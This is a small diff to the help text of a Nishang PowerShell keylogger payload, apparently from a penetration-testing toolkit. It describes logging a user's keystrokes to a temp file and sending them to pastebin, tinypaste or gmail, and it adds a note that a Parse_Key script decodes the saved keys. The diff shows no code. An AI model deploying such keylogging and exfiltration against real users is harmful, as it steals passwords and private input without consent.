@@ -4,7 +4,8 @@ Nishang Payload which logs keys.
 
 .DESCRIPTION
 This payload logs a user's keys and writes them to file key.log (I know its bad :|) in user's temp directory.
-The keys are than pasted to pastebin|tinypaste|gmail|all as per selection.
+The keys are than pasted to pastebin|tinypaste|gmail|all as per selection. Saved keys could then be decoded
+using the Parse_Key script in nishang.
 
 .PARAMETER dev_key
 The Unique API key provided by pastebin when you register a free account.
